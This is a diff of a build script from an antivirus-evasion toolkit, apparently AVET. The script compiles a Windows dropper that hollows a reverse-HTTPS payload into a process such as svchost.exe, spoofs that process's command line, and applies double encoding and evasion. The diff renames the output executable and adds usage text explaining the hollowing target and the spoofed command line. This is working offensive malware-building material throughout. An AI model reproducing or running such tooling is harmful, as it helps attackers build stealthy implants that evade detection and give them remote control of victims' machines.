@@ -8,7 +8,7 @@
 
 # Usage example of generated output.exe:
 #
-# output.exe first second C:\windows\system32\svchost.exe,C:\i\spoofed\this.exe
+# hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe first second C:\windows\system32\svchost.exe,C:\i\spoofed\this.exe
 #
 # The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.
 # The format of the third parameter is expected to be as follows:	<process to hollow into>,<desired command line of new process>
@@ -150,7 +150,26 @@ enable_debug_print to_file C:/users/public/dropper_log.txt
 # compile hollowing payload
 $win64_compiler -o output/hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe source/avet.c -lws2_32
 strip output/hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe
-printf "\n Generated dropper executable output/output.exe\n"
+printf "\n Generated dropper executable output/hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe\n"
 
 # cleanup
 cleanup_techniques
+
+echo "
+# Usage example of generated hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe:\n
+#\n
+# hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe first second C:\windows\system32\svchost.exe,C:\i\spoofed\this.exe\n
+#\n
+# The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.\n
+# The format of the third parameter is expected to be as follows:	<process to hollow into>,<desired command line of new process>\n
+# So you need to specify two values, separated by a comma delimiter.\n
+#\n
+# <process to hollow into>:\n
+# Path to the executable image of your hollowing target. Based on this image, A NEW PROCESS WILL BE CREATED and your actual payload hollowed into it.\n
+#\n
+# <parent command line of new process>:\n
+# Specifies the command line of the newly created process. This will be passed internally as an argument for CreateProcess.\n
+# So you can basically spoof the command line of your hollowing target here.\n
+#\n
+# !!!\n
+# You are expected to keep the required format and specify all above mentioned parameters. Otherwise the program will probably crash (Who properly validates input anyway? The user always knows best ;))."
